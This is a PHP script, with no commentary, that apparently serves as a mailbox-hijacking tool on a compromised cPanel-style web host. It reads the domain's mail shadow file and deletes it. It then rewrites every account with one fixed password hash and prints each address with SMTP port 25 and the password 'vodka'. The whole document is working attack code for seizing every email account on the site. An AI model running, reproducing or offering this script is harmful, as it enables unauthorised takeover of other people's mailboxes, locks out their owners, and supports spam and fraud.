<?php
set_time_limit(0);
 $t = $_SERVER['SERVER_NAME'];
 $t = @str_replace("www.","",$t);
@$passwd = file_get_contents('/home/'.get_current_user().'/etc/'.$t.'/shadow');
$ex=explode("\r\n",$passwd);
@unlink('/home/'.get_current_user().'/etc/'.$t.'/shadow');
foreach($ex as $ex){
$ex=explode(':',$ex);
$e= $ex[0];
if ($e){
$b=fopen('/home/'.get_current_user().'/etc/'.$t.'/shadow','ab');fwrite($b,$e.':$6$roottn$sMVQO5HQfxAqtdarLWPdj092B.1km9RMKFGhLxfTL/gB0wehJllwpoTEbiVY3qGL5fkZp38DwscszpwOjKriX0:16249:::::'."\r\n");fclose($b);
echo '<span style=\'color:#00ff00;\'>'.$t.'|25|'.$e.'@'.$t.'|vodka</span><br>';  "</center>";
}}

?>